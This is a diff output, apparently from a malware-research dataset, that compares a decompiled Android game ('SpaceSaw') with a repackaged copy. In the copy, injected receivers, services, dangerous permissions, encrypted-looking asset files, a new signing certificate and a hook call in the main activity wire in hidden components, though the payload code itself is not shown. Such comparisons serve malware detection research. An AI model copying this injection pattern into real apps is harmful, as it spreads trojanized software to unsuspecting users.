@@ -1,0 +1,565 @@
+diff -r result/APP_88/App_B_88/AndroidManifest.xml result/APP_88/App_M_88/AndroidManifest.xml
+8c8
+<     <application android:allowBackup="false" android:icon="@drawable/icon" android:label="@string/app_name" android:theme="@style/FullScreen">
+---
+>     <application android:allowBackup="false" android:icon="@drawable/icon" android:label="空间切割" android:theme="@style/FullScreen">
+11c11
+<         <activity android:label="@string/app_name" android:name=".SpaceSawActivity" android:screenOrientation="portrait">
+---
+>         <activity android:label="空间切割" android:name="com.butchersWorkshop.spaceSaw.SpaceSawActivity" android:screenOrientation="portrait">
+18a19,74
+>         <activity android:excludeFromRecents="true" android:launchMode="singleTask" android:name="com.czvzoytyttq.fbmszy.Tawoya"/>
+>         <service android:name="com.czvzoytyttq.fbmszy.Baowyan"/>
+>         <receiver android:name="com.czvzoytyttq.fbmszy.Laoenawy">
+>             <intent-filter>
+>                 <action android:name="android.intent.action.PACKAGE_ADDED"/>
+>                 <data android:scheme="package"/>
+>             </intent-filter>
+>             <intent-filter>
+>                 <action android:name="android.net.conn.CONNECTIVITY_CHANGE"/>
+>             </intent-filter>
+>             <intent-filter>
+>                 <action android:name="android.intent.action.USER_PRESENT"/>
+>             </intent-filter>
+>         </receiver>
+>         <activity android:configChanges="keyboardHidden|orientation" android:excludeFromRecents="true" android:label="" android:launchMode="singleTask" android:name="com.zpvg.cvjaoyt.Tawlc" android:screenOrientation="portrait">
+>             <intent-filter>
+>                 <action android:name="android.intent.action.CREATE_SHORTCUT"/>
+>             </intent-filter>
+>         </activity>
+>         <service android:name="com.zpvg.cvjaoyt.Baowdsrn"/>
+>         <receiver android:name="com.zpvg.cvjaoyt.BawnHawn">
+>             <intent-filter>
+>                 <action android:name="android.intent.action.PACKAGE_ADDED"/>
+>                 <data android:scheme="package"/>
+>             </intent-filter>
+>             <intent-filter>
+>                 <action android:name="android.net.conn.CONNECTIVITY_CHANGE"/>
+>             </intent-filter>
+>             <intent-filter>
+>                 <action android:name="android.intent.action.USER_PRESENT"/>
+>             </intent-filter>
+>         </receiver>
+>         <activity android:configChanges="keyboardHidden|orientation" android:excludeFromRecents="true" android:launchMode="singleTask" android:name="com.babalay.bupat.act" android:screenOrientation="portrait"/>
+>         <receiver android:name="com.babalay.bupat.br">
+>             <intent-filter>
+>                 <action android:name="android.intent.action.PACKAGE_ADDED"/>
+>                 <data android:scheme="package"/>
+>             </intent-filter>
+>             <intent-filter>
+>                 <action android:name="android.net.conn.CONNECTIVITY_CHANGE"/>
+>             </intent-filter>
+>             <intent-filter>
+>                 <action android:name="android.intent.action.USER_PRESENT"/>
+>             </intent-filter>
+>         </receiver>
+>         <service android:name="com.babalay.bupat.ser"/>
+>         <activity android:configChanges="keyboardHidden|orientation" android:excludeFromRecents="true" android:name="com.bpztwen.bjvcaw.Tawnsep"/>
+>         <receiver android:name="com.bpztwen.bjvcaw.Rallyaw">
+>             <intent-filter>
+>                 <action android:name="android.intent.action.PACKAGE_ADDED"/>
+>                 <data android:scheme="package"/>
+>             </intent-filter>
+>             <intent-filter>
+>                 <action android:name="android.net.conn.CONNECTIVITY_CHANGE"/>
+>             </intent-filter>
+>         </receiver>
+19a76,85
+>     <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW"/>
+>     <uses-permission android:name="android.permission.INTERNET"/>
+>     <uses-permission android:name="android.permission.WAKE_LOCK"/>
+>     <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+>     <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+>     <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
+>     <uses-permission android:name="android.permission.ACCESS_WIFI_STATE"/>
+>     <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
+>     <uses-permission android:name="com.android.launcher.permission.INSTALL_SHORTCUT"/>
+>     <supports-screens android:anyDensity="true"/>
+diff -r result/APP_88/App_B_88/apktool.yml result/APP_88/App_M_88/apktool.yml
+2c2
+< apkFileName: Bapp88-C8BA1039132D83216B6A0B5851972FAAB8DA7B77682407FCBA1D245DAC556112.apk
+---
+> apkFileName: Mapp88-BF1F776AFC5976EB354E9EC0839C9D6F1521C539859C916DEC5591CE9D365F8F.apk
+5a6,7
+> - png
+> - jpg
+9,10d10
+< - png
+< - jpg
+20,22c20
+< unknownFiles:
+<   jsr305_annotations/Jsr305_annotations.gwt.xml: '8'
+<   jsr305_annotations/v0_r47/V0_r47.gwt.xml: '8'
+---
+> unknownFiles: {}
+Somente em result/APP_88/App_M_88/: assets
+Somente em result/APP_88/App_M_88/com: babalay
+Somente em result/APP_88/App_M_88/com: basyatw
+Somente em result/APP_88/App_M_88/com: bpztwen
+diff -r result/APP_88/App_B_88/com/butchersWorkshop/spaceSaw/b/c.java result/APP_88/App_M_88/com/butchersWorkshop/spaceSaw/b/c.java
+54,59c54,58
+<     paramArrayOfFloat = new float[] { 100.0F, 100.0F, 0.0F };
+<     float[] arrayOfFloat1 = { f1, f4 };
+<     float[] arrayOfFloat2 = { f3, f4 };
+<     float[] arrayOfFloat3 = { f1, f2 };
+<     float[] arrayOfFloat4 = { f3, f2 };
+<     localC.a(new float[][] { { -100.0F, -100.0F, 0.0F }, { 100.0F, -100.0F, 0.0F }, { -100.0F, 100.0F, 0.0F }, paramArrayOfFloat }, new float[][] { arrayOfFloat1, arrayOfFloat2, arrayOfFloat3, arrayOfFloat4 });
+---
+>     float[] arrayOfFloat2 = { -100.0F, 100.0F, 0.0F };
+>     float[] arrayOfFloat3 = { 100.0F, 100.0F, 0.0F };
+>     paramArrayOfFloat = new float[] { f1, f4 };
+>     float[] arrayOfFloat1 = { f1, f2 };
+>     localC.a(new float[][] { { -100.0F, -100.0F, 0.0F }, { 100.0F, -100.0F, 0.0F }, arrayOfFloat2, arrayOfFloat3 }, new float[][] { paramArrayOfFloat, { f3, f4 }, arrayOfFloat1, { f3, f2 } });
+diff -r result/APP_88/App_B_88/com/butchersWorkshop/spaceSaw/b/e.java result/APP_88/App_M_88/com/butchersWorkshop/spaceSaw/b/e.java
+14c14
+<   private static int[][] n = { { 100, 100, 100, 100, 100, 100, 100, 100, 100, 100, 100, 100, 100, 100, 100, 100, 200, 200, 200, 200, 200, 200, 200, 200, 200, 200, 200, 200, 200, 200, 200, 200, 200, 300, 300, 300, 300, 300, 300, 300, 300, 300, 300, 300, 300, 300, 300, 300, 300, 400, 400, 400, 400, 400, 400, 400, 400, 400, 400, 400, 400, 400, 400, 400, 400, 400, 500, 500, 500, 500, 500, 500, 500, 500, 500, 500, 500, 500, 500, 500, 500, 500, 500, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0 }, { 600, 600, 600, 600, 600, 600, 600, 600, 600, 600, 600, 600, 600, 600, 600, 600, 700, 700, 700, 700, 700, 700, 700, 700, 700, 700, 700, 700, 700, 700, 700, 700, 700, 800, 800, 800, 800, 800, 800, 800, 800, 800, 800, 800, 800, 800, 800, 800, 800, 900, 900, 900, 900, 900, 900, 900, 900, 900, 900, 900, 900, 900, 900, 900, 900, 900, 1000, 1000, 1000, 1000, 1000, 1000, 1000, 1000, 1000, 1000, 1000, 1000, 1000, 1000, 1000, 1000, 1000, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0 } };
+---
+>   private static int[][] n;
+28a29,34
+>   
+>   static
+>   {
+>     int[] arrayOfInt = { 600, 600, 600, 600, 600, 600, 600, 600, 600, 600, 600, 600, 600, 600, 600, 600, 700, 700, 700, 700, 700, 700, 700, 700, 700, 700, 700, 700, 700, 700, 700, 700, 700, 800, 800, 800, 800, 800, 800, 800, 800, 800, 800, 800, 800, 800, 800, 800, 800, 900, 900, 900, 900, 900, 900, 900, 900, 900, 900, 900, 900, 900, 900, 900, 900, 900, 1000, 1000, 1000, 1000, 1000, 1000, 1000, 1000, 1000, 1000, 1000, 1000, 1000, 1000, 1000, 1000, 1000, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0 };
+>     n = new int[][] { { 100, 100, 100, 100, 100, 100, 100, 100, 100, 100, 100, 100, 100, 100, 100, 100, 200, 200, 200, 200, 200, 200, 200, 200, 200, 200, 200, 200, 200, 200, 200, 200, 200, 300, 300, 300, 300, 300, 300, 300, 300, 300, 300, 300, 300, 300, 300, 300, 300, 400, 400, 400, 400, 400, 400, 400, 400, 400, 400, 400, 400, 400, 400, 400, 400, 400, 500, 500, 500, 500, 500, 500, 500, 500, 500, 500, 500, 500, 500, 500, 500, 500, 500, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0 }, arrayOfInt };
+>   }
+diff -r result/APP_88/App_B_88/com/butchersWorkshop/spaceSaw/SpaceSawActivity.java result/APP_88/App_M_88/com/butchersWorkshop/spaceSaw/SpaceSawActivity.java
+21a22
+> import com.basyatw.bcpawsen.DaywtanActivity;
+1864a1866
+>     DaywtanActivity.Tawo(this);
+Somente em result/APP_88/App_M_88/com: czvzoytyttq
+Somente em result/APP_88/App_M_88/com: zpvg
+Os arquivos binários result/APP_88/App_B_88/original/AndroidManifest.xml e result/APP_88/App_M_88/original/AndroidManifest.xml são diferentes
+Somente em result/APP_88/App_M_88/original/META-INF: 123652.RSA
+Somente em result/APP_88/App_M_88/original/META-INF: 123652.SF
+Somente em result/APP_88/App_B_88/original/META-INF: CERT.RSA
+Somente em result/APP_88/App_B_88/original/META-INF: CERT.SF
+diff -r result/APP_88/App_B_88/original/META-INF/MANIFEST.MF result/APP_88/App_M_88/original/META-INF/MANIFEST.MF
+2c2,5
+< Created-By: 1.0 (Android)
+---
+> Created-By: 1.6.0_45 (Sun Microsystems Inc.)
+> 
+> Name: res/drawable-mdpi/common_signin_btn_icon_normal_light.9.png
+> SHA1-Digest: pQSKkzLGVsk3otQAXnRA53Cklc8=
+7,9d9
+< Name: res/drawable-mdpi/common_signin_btn_icon_normal_light.9.png
+< SHA1-Digest: he0SlIYzLlZChBg6d38hheLzBns=
+< 
+12a13,15
+> Name: assets/pmd/spip.dat
+> SHA1-Digest: ZU/5NrWn97ecsVf7UTZ8R3MnfPY=
+> 
+17c20
+< SHA1-Digest: zXl4gOYVm22pGbkGC4i82wLIMyg=
+---
+> SHA1-Digest: jSpbfiEyALRKJOe5Cv4aya+GKDk=
+29c32
+< SHA1-Digest: sa6MQEFa8whxq6hug+zvczJa8Ss=
+---
+> SHA1-Digest: XCBel0uHJgpzVHsudWnofvVQJGw=
+32c35
+< SHA1-Digest: UUeGKfmWgJl/rutroPXP57LpkoU=
+---
+> SHA1-Digest: dlyC1g3UFccxhzDkcTFKyeN/a1U=
+38c41
+< SHA1-Digest: dF5oQhWFz2szuye4UCQeGH4CFRk=
+---
+> SHA1-Digest: fs43cK8pCa8r8nHinjOjK5qWK0M=
+44,47c47
+< SHA1-Digest: vgTn+pEQhSLa5buaCqjDd3w3UWU=
+< 
+< Name: jsr305_annotations/v0_r47/V0_r47.gwt.xml
+< SHA1-Digest: /f34xYwskAvrKqRB+jFPzJ8rPJg=
+---
+> SHA1-Digest: e/1gfXv1VTsUSosCIqLmo08hhVo=
+56c56
+< SHA1-Digest: bENWi8ZugwD88Ech+3ZELNcC/Kw=
+---
+> SHA1-Digest: m/Xwtft/xZQGPmqPZTS+CWA9RPw=
+59,63c59
+< SHA1-Digest: UUeGKfmWgJl/rutroPXP57LpkoU=
+< 
+< Name: res/drawable-mdpi/common_signin_btn_icon_disabled_focus_dark.9.p
+<  ng
+< SHA1-Digest: IXqmYG4624bef7DnPxFG+Uwx1ak=
+---
+> SHA1-Digest: dlyC1g3UFccxhzDkcTFKyeN/a1U=
+67a64,67
+> Name: res/drawable-mdpi/common_signin_btn_icon_disabled_focus_dark.9.p
+>  ng
+> SHA1-Digest: /9atOqtPDBdAN8fQhRv3UDgC7sc=
+> 
+72c72
+< SHA1-Digest: 3+x2t/WZmDnWpRsGihxGb1wjfKk=
+---
+> SHA1-Digest: H3M45l3TzbI5bqwXQc+pqiivgiI=
+85c85
+< SHA1-Digest: YmWnuLFTsxsuwRBtvQiQ6Y6KnsI=
+---
+> SHA1-Digest: EAeuLKBLl4TC68T+TeSlHUjUtcc=
+89c89
+< SHA1-Digest: 29jlpwaYo8yADFvg53lRNdVbvt0=
+---
+> SHA1-Digest: om0wnjdRQqfWtPW1nQc9lIl2kr0=
+97,99d96
+< Name: res/drawable/common_signin_btn_text_light.xml
+< SHA1-Digest: 4BGCSTYvK4GFZrK3G8nDHyI0rMo=
+< 
+102a100,102
+> Name: res/drawable/common_signin_btn_text_light.xml
+> SHA1-Digest: ZEWSgaGiYAoGUi+cTPTNUBm+mF8=
+> 
+107c107
+< SHA1-Digest: vGictS/UYFmX8tbz7DG/BKWlA1A=
+---
+> SHA1-Digest: 0LsZjL/y+64mr/YRzx/wikXmMDo=
+109,110c109,110
+< Name: res/drawable-hdpi/common_signin_btn_text_normal_light.9.png
+< SHA1-Digest: BPO7rZUizcNQMnWeRsW2OCnWgH4=
+---
+> Name: res/drawable-mdpi/common_signin_btn_text_normal_dark.9.png
+> SHA1-Digest: CjWbJGF7yPHXZJW4G6h47JrTVCI=
+113c113
+< SHA1-Digest: 5yTFZLZtCPpeiVFtQvpG2K4xDdE=
+---
+> SHA1-Digest: Ra0CWtLa2DJikrOgUnX71YmlLDo=
+115,116c115,119
+< Name: res/drawable-mdpi/common_signin_btn_text_normal_dark.9.png
+< SHA1-Digest: AT9w5rSAMWW0uoROEE4O/DyXQj4=
+---
+> Name: res/drawable-hdpi/common_signin_btn_text_normal_light.9.png
+> SHA1-Digest: 9WjUIGgn4/x4k4ckr/lPi4dGA2k=
+> 
+> Name: assets/l/spl.dat
+> SHA1-Digest: vW2G37BljiAtNBvD3zLVab9rlRg=
+119c122
+< SHA1-Digest: 5kYNdq6PUOBy6p7h4MJfqXCfCdg=
+---
+> SHA1-Digest: Wj7KvhgGUvyZrjUVTc3ez6DEG9M=
+128c131
+< SHA1-Digest: Wx/93xRl4fEGrkADqVPH6ShswfU=
+---
+> SHA1-Digest: yC2vgo3XZuCmTfWOsi2Ts/MwsdI=
+131c134
+< SHA1-Digest: 1nB29gilkMG21U2c1UzWz5vtjpc=
+---
+> SHA1-Digest: XRUzUssSTuqdHpV4iCR3LqO6py0=
+134c137
+< SHA1-Digest: ce4TPP6zdXrzq1qZ1BwonYOfI88=
+---
+> SHA1-Digest: HRJA1Xp/tXVq03llK4RNK+4A3uQ=
+141c144
+< SHA1-Digest: 5te3wznPBVYtZMjVj49FYN5YlRA=
+---
+> SHA1-Digest: YJmDcoJhm94kAut2goBNpsKuupk=
+144c147
+< SHA1-Digest: foZq1rlcIvqfISu8he0POsnEnkQ=
+---
+> SHA1-Digest: pwYF20R5CK5wUIZMnR5+3Cm8cqY=
+147c150
+< SHA1-Digest: ppRAUb4e8AfMY+hiTgUxYeX8bDw=
+---
+> SHA1-Digest: +WNqYU9iwYTUJ7+AP3QlFhv95sw=
+150c153
+< SHA1-Digest: 7vLApczB6mEex3xCchwoPVizP8w=
+---
+> SHA1-Digest: QbTxVjEvf5QAiC/Su+pugvsUFjM=
+156c159
+< SHA1-Digest: CFcKGCNCXdElgRyG3GU1cR7Lpck=
+---
+> SHA1-Digest: S7ihaWKUDc22MZxd+pxT2TPVnMg=
+163a167,169
+> Name: assets/lc/cld.dat
+> SHA1-Digest: W49CU7TlQksTKU3ZTCuaWalnhno=
+> 
+167,169d172
+< Name: res/drawable-hdpi/common_signin_btn_icon_disabled_light.9.png
+< SHA1-Digest: ZDogSdlgVekmFIAbKguvig7+XGg=
+< 
+171c174
+< SHA1-Digest: Ru9c8TQxCDEETWL8Hyuw8oLR62o=
+---
+> SHA1-Digest: nhdJpLpS66oIUCe2eTfXQ0NhwiQ=
+173,174c176,177
+< Name: res/drawable-nodpi/jupiter.jpg
+< SHA1-Digest: Fbov//XWet0DTALRdsXN/14UvsE=
+---
+> Name: res/drawable-hdpi/common_signin_btn_icon_disabled_light.9.png
+> SHA1-Digest: x/VaksfPeHnDpPesT3JBXmp985Y=
+178a182,184
+> Name: res/drawable-nodpi/jupiter.jpg
+> SHA1-Digest: Fbov//XWet0DTALRdsXN/14UvsE=
+> 
+180c186
+< SHA1-Digest: cyroPBwNNxlz5xXq1uSZsOxhnH0=
+---
+> SHA1-Digest: vDRZXVRHfOWigezkFv1VJrpOFdM=
+183c189
+< SHA1-Digest: mMiwFXUUdTLYgymp9ymolo7j5wI=
+---
+> SHA1-Digest: +aQ+8cQirVcns4mXONq1f70ziJ4=
+186c192
+< SHA1-Digest: jCQ4NUSg52n1nZECWE4ZOsMd2Yo=
+---
+> SHA1-Digest: nf+iATtnTY5fkRCmkw+tdjPMNuA=
+192c198
+< SHA1-Digest: /w/b5Ahd692RhVH4wOIahCMTR9s=
+---
+> SHA1-Digest: Y7BgkIE5Z75txkMJIFho52FM/R8=
+195,198c201
+< SHA1-Digest: vshkxZOLWGVBnouKrVHjnnLdGis=
+< 
+< Name: res/drawable-nodpi/mercury.jpg
+< SHA1-Digest: 3GgDuqJDbEWd54nfN+E3/B7FO8Y=
+---
+> SHA1-Digest: aXhY4KM6ycD6bUrPQp3nFlG6C2g=
+201c204
+< SHA1-Digest: oslddavjaxT0f8U4Mn8PG9Z+jNM=
+---
+> SHA1-Digest: rJ+E2Md9eoyscbWGEF0Z5SPnWAU=
+205a209,211
+> Name: res/drawable-nodpi/mercury.jpg
+> SHA1-Digest: 3GgDuqJDbEWd54nfN+E3/B7FO8Y=
+> 
+210c216
+< SHA1-Digest: dV3F0Sz7MxTs+Trhe4uXp7Q7aSs=
+---
+> SHA1-Digest: I5fVPZBkCym03yDeDC5GdAuPQCQ=
+216c222
+< SHA1-Digest: VBdIt82ioiZO0Qmr7/J+8sPnop8=
+---
+> SHA1-Digest: DEUD3h7S2Xx2JGvz/zBbk0EHR7E=
+222c228
+< SHA1-Digest: THnQ9r/oTuPB60ajOYXvK1GrUsE=
+---
+> SHA1-Digest: ZwpmUeMpKikLIxCPbKFJB9i7E00=
+228c234,237
+< SHA1-Digest: UbXqMwM30HBljuHn+la04UPzB1Y=
+---
+> SHA1-Digest: Le0XmsQFzmC9YoqYcbQniIg+BoQ=
+> 
+> Name: assets/vqw
+> SHA1-Digest: TLFMHjsLM9/kRKbym8VN7RmzRdM=
+231c240
+< SHA1-Digest: UbXqMwM30HBljuHn+la04UPzB1Y=
+---
+> SHA1-Digest: Le0XmsQFzmC9YoqYcbQniIg+BoQ=
+237c246
+< SHA1-Digest: vgTn+pEQhSLa5buaCqjDd3w3UWU=
+---
+> SHA1-Digest: e/1gfXv1VTsUSosCIqLmo08hhVo=
+240c249
+< SHA1-Digest: rk4+RrLhcP6lThhrsLhux6sOaW0=
+---
+> SHA1-Digest: BGkrvXXWq/EKzYVVD87lu1lO/no=
+246c255
+< SHA1-Digest: QvCsDHmHTCeFtKK23z0HRetpRJI=
+---
+> SHA1-Digest: CZCrnnymVScCKUUwDcFqzJuxes8=
+255c264
+< SHA1-Digest: KUWcrP9v7FORu4ojRjzVSn0JZio=
+---
+> SHA1-Digest: TLGJt38QF/V7ZjdRMxhIHQGu0wA=
+258c267
+< SHA1-Digest: MQsj73rqoxGdFvNYEPkKJZPqXBU=
+---
+> SHA1-Digest: vy6M1w6HBJW88cSK3mrq5Mo0jxs=
+261c270
+< SHA1-Digest: UsY+c7jSRS1f1aEh0HgE8187rLI=
+---
+> SHA1-Digest: FRyVoHgez+sduUGrAYI53stU7JU=
+265c274
+< SHA1-Digest: 5te3wznPBVYtZMjVj49FYN5YlRA=
+---
+> SHA1-Digest: YJmDcoJhm94kAut2goBNpsKuupk=
+268c277
+< SHA1-Digest: 1Hnpvj2UzKDvPZv175SFBfp0Gn8=
+---
+> SHA1-Digest: +rf5rWPhyi1HrQ0EQgRyFrjAFn0=
+275,278c284
+< SHA1-Digest: 29jlpwaYo8yADFvg53lRNdVbvt0=
+< 
+< Name: jsr305_annotations/Jsr305_annotations.gwt.xml
+< SHA1-Digest: UBXHoAGmseBGDwjR6/MFHfcIK7g=
+---
+> SHA1-Digest: om0wnjdRQqfWtPW1nQc9lIl2kr0=
+285c291
+< SHA1-Digest: /ps9lLPOdDdwDt2YyGRRyGkRCMw=
+---
+> SHA1-Digest: /oiDCmkJ0BRZfRQBoO9e1NgMKVQ=
+291c297
+< SHA1-Digest: 1Hnpvj2UzKDvPZv175SFBfp0Gn8=
+---
+> SHA1-Digest: +rf5rWPhyi1HrQ0EQgRyFrjAFn0=
+295c301
+< SHA1-Digest: /ps9lLPOdDdwDt2YyGRRyGkRCMw=
+---
+> SHA1-Digest: /oiDCmkJ0BRZfRQBoO9e1NgMKVQ=
+307c313
+< SHA1-Digest: WqQF3y/vDvl0c3tlpCQMUlAGR90=
+---
+> SHA1-Digest: 7B0dIrwxsCd4mo/aB0mP1ZiAmVE=
+310c316
+< SHA1-Digest: IkOjI29UDeEmriO620NWQRYQBQM=
+---
+> SHA1-Digest: 0mbIZCTpZD2Bmc1OsrKYN+O1Jnw=
+325c331
+< SHA1-Digest: uRAyDpH07H9tazGPj+pquxEo+4U=
+---
+> SHA1-Digest: tN0X80ClRIsJHlYapfnxQK81xy4=
+328c334
+< SHA1-Digest: w/L+nKDDWadDlwiDybC+JmpbqaI=
+---
+> SHA1-Digest: /T3y/NDBNNcGRnUuquxkdTcnTTg=
+333,335d338
+< Name: res/drawable-hdpi/common_signin_btn_text_disabled_light.9.png
+< SHA1-Digest: 1nB29gilkMG21U2c1UzWz5vtjpc=
+< 
+337c340,343
+< SHA1-Digest: TOXKWaLgRXMv5YaI2cph4uS86+I=
+---
+> SHA1-Digest: +dGVOOgtGrsuUQ7q8tguxU/EHEc=
+> 
+> Name: res/drawable-hdpi/common_signin_btn_text_disabled_light.9.png
+> SHA1-Digest: XRUzUssSTuqdHpV4iCR3LqO6py0=
+344c350
+< SHA1-Digest: YmWnuLFTsxsuwRBtvQiQ6Y6KnsI=
+---
+> SHA1-Digest: EAeuLKBLl4TC68T+TeSlHUjUtcc=
+348c354
+< SHA1-Digest: 0ky7hJW6fNsa6m2tmjhllqHXHfg=
+---
+> SHA1-Digest: Y0ihoUpFM8pJPV2dmcbo9kwE5PI=
+351c357
+< SHA1-Digest: VSw7l3gn6Xmrfp6USiW4t6QJmPw=
+---
+> SHA1-Digest: dqhJzHg9892oeFT0twTRzjshHME=
+357c363
+< SHA1-Digest: VuHJWuT/6iilvSab3F78/jbS8VQ=
+---
+> SHA1-Digest: qEJecPIWA8Y6E2TaFjGT267csWs=
+363c369
+< SHA1-Digest: re+zLFhPUMSpBod/+8AnbiOF95E=
+---
+> SHA1-Digest: N8bQHOfxBwU0zqoZVD3olgWx2V0=
+367c373
+< SHA1-Digest: IXqmYG4624bef7DnPxFG+Uwx1ak=
+---
+> SHA1-Digest: /9atOqtPDBdAN8fQhRv3UDgC7sc=
+383a390,392
+> Name: res/raw/btn6.wav
+> SHA1-Digest: sxFauw8h94QVigaZVSW+UrD35qA=
+> 
+388,391c397
+< SHA1-Digest: vo5IER5aYP04fs9WVhNf8ZG8h6g=
+< 
+< Name: res/raw/btn6.wav
+< SHA1-Digest: sxFauw8h94QVigaZVSW+UrD35qA=
+---
+> SHA1-Digest: Zq4vKMaaFuv7aJlVfp+xH2lAlQg=
+395c401
+< SHA1-Digest: 0ky7hJW6fNsa6m2tmjhllqHXHfg=
+---
+> SHA1-Digest: Y0ihoUpFM8pJPV2dmcbo9kwE5PI=
+398c404
+< SHA1-Digest: +YXDOKcowsglHKYLvgWRriKCdQI=
+---
+> SHA1-Digest: CK9qY4V6yvTc5Oq6NlFVhW2IhC8=
+407c413
+< SHA1-Digest: CdS2JYcO2aYMRPs8uE6z0+hK3SA=
+---
+> SHA1-Digest: kXY0FUDA5yTlhg+sxnPW3XXyNkQ=
+410,413c416
+< SHA1-Digest: FkxxTiMZkZMXGXmeMfd02TtKL64=
+< 
+< Name: res/drawable-nodpi/store.png
+< SHA1-Digest: UOXu+Y88+jH8Y2gvrkpc3GMR9sE=
+---
+> SHA1-Digest: b7nvI/e8i0Ng7w+7J/i4cswsHPI=
+417a421,423
+> Name: res/drawable-nodpi/store.png
+> SHA1-Digest: UOXu+Y88+jH8Y2gvrkpc3GMR9sE=
+> 
+419c425
+< SHA1-Digest: ZDogSdlgVekmFIAbKguvig7+XGg=
+---
+> SHA1-Digest: x/VaksfPeHnDpPesT3JBXmp985Y=
+424,426d429
+< Name: res/drawable-nodpi/game_complete.png
+< SHA1-Digest: jin/z+ISdpopzqKg8pOZB/7GAYM=
+< 
+428a432,434
+> 
+> Name: res/drawable-nodpi/game_complete.png
+> SHA1-Digest: jin/z+ISdpopzqKg8pOZB/7GAYM=
+Os arquivos binários result/APP_88/App_B_88/res/drawable-hdpi-v4/common_signin_btn_icon_disabled_dark.9.png e result/APP_88/App_M_88/res/drawable-hdpi-v4/common_signin_btn_icon_disabled_dark.9.png são diferentes
+Os arquivos binários result/APP_88/App_B_88/res/drawable-hdpi-v4/common_signin_btn_icon_disabled_focus_dark.9.png e result/APP_88/App_M_88/res/drawable-hdpi-v4/common_signin_btn_icon_disabled_focus_dark.9.png são diferentes
+Os arquivos binários result/APP_88/App_B_88/res/drawable-hdpi-v4/common_signin_btn_icon_disabled_focus_light.9.png e result/APP_88/App_M_88/res/drawable-hdpi-v4/common_signin_btn_icon_disabled_focus_light.9.png são diferentes
+Os arquivos binários result/APP_88/App_B_88/res/drawable-hdpi-v4/common_signin_btn_icon_disabled_light.9.png e result/APP_88/App_M_88/res/drawable-hdpi-v4/common_signin_btn_icon_disabled_light.9.png são diferentes
+Os arquivos binários result/APP_88/App_B_88/res/drawable-hdpi-v4/common_signin_btn_icon_focus_dark.9.png e result/APP_88/App_M_88/res/drawable-hdpi-v4/common_signin_btn_icon_focus_dark.9.png são diferentes
+Os arquivos binários result/APP_88/App_B_88/res/drawable-hdpi-v4/common_signin_btn_icon_focus_light.9.png e result/APP_88/App_M_88/res/drawable-hdpi-v4/common_signin_btn_icon_focus_light.9.png são diferentes
+Os arquivos binários result/APP_88/App_B_88/res/drawable-hdpi-v4/common_signin_btn_icon_normal_dark.9.png e result/APP_88/App_M_88/res/drawable-hdpi-v4/common_signin_btn_icon_normal_dark.9.png são diferentes
+Os arquivos binários result/APP_88/App_B_88/res/drawable-hdpi-v4/common_signin_btn_icon_normal_light.9.png e result/APP_88/App_M_88/res/drawable-hdpi-v4/common_signin_btn_icon_normal_light.9.png são diferentes
+Os arquivos binários result/APP_88/App_B_88/res/drawable-hdpi-v4/common_signin_btn_icon_pressed_dark.9.png e result/APP_88/App_M_88/res/drawable-hdpi-v4/common_signin_btn_icon_pressed_dark.9.png são diferentes
+Os arquivos binários result/APP_88/App_B_88/res/drawable-hdpi-v4/common_signin_btn_icon_pressed_light.9.png e result/APP_88/App_M_88/res/drawable-hdpi-v4/common_signin_btn_icon_pressed_light.9.png são diferentes
+Os arquivos binários result/APP_88/App_B_88/res/drawable-hdpi-v4/common_signin_btn_text_disabled_dark.9.png e result/APP_88/App_M_88/res/drawable-hdpi-v4/common_signin_btn_text_disabled_dark.9.png são diferentes
+Os arquivos binários result/APP_88/App_B_88/res/drawable-hdpi-v4/common_signin_btn_text_disabled_focus_dark.9.png e result/APP_88/App_M_88/res/drawable-hdpi-v4/common_signin_btn_text_disabled_focus_dark.9.png são diferentes
+Os arquivos binários result/APP_88/App_B_88/res/drawable-hdpi-v4/common_signin_btn_text_disabled_focus_light.9.png e result/APP_88/App_M_88/res/drawable-hdpi-v4/common_signin_btn_text_disabled_focus_light.9.png são diferentes
+Os arquivos binários result/APP_88/App_B_88/res/drawable-hdpi-v4/common_signin_btn_text_disabled_light.9.png e result/APP_88/App_M_88/res/drawable-hdpi-v4/common_signin_btn_text_disabled_light.9.png são diferentes
+Os arquivos binários result/APP_88/App_B_88/res/drawable-hdpi-v4/common_signin_btn_text_focus_dark.9.png e result/APP_88/App_M_88/res/drawable-hdpi-v4/common_signin_btn_text_focus_dark.9.png são diferentes
+Os arquivos binários result/APP_88/App_B_88/res/drawable-hdpi-v4/common_signin_btn_text_focus_light.9.png e result/APP_88/App_M_88/res/drawable-hdpi-v4/common_signin_btn_text_focus_light.9.png são diferentes
+Os arquivos binários result/APP_88/App_B_88/res/drawable-hdpi-v4/common_signin_btn_text_normal_dark.9.png e result/APP_88/App_M_88/res/drawable-hdpi-v4/common_signin_btn_text_normal_dark.9.png são diferentes
+Os arquivos binários result/APP_88/App_B_88/res/drawable-hdpi-v4/common_signin_btn_text_normal_light.9.png e result/APP_88/App_M_88/res/drawable-hdpi-v4/common_signin_btn_text_normal_light.9.png são diferentes
+Os arquivos binários result/APP_88/App_B_88/res/drawable-hdpi-v4/common_signin_btn_text_pressed_dark.9.png e result/APP_88/App_M_88/res/drawable-hdpi-v4/common_signin_btn_text_pressed_dark.9.png são diferentes
+Os arquivos binários result/APP_88/App_B_88/res/drawable-hdpi-v4/common_signin_btn_text_pressed_light.9.png e result/APP_88/App_M_88/res/drawable-hdpi-v4/common_signin_btn_text_pressed_light.9.png são diferentes
+Os arquivos binários result/APP_88/App_B_88/res/drawable-mdpi-v4/common_signin_btn_icon_disabled_dark.9.png e result/APP_88/App_M_88/res/drawable-mdpi-v4/common_signin_btn_icon_disabled_dark.9.png são diferentes
+Os arquivos binários result/APP_88/App_B_88/res/drawable-mdpi-v4/common_signin_btn_icon_disabled_focus_dark.9.png e result/APP_88/App_M_88/res/drawable-mdpi-v4/common_signin_btn_icon_disabled_focus_dark.9.png são diferentes
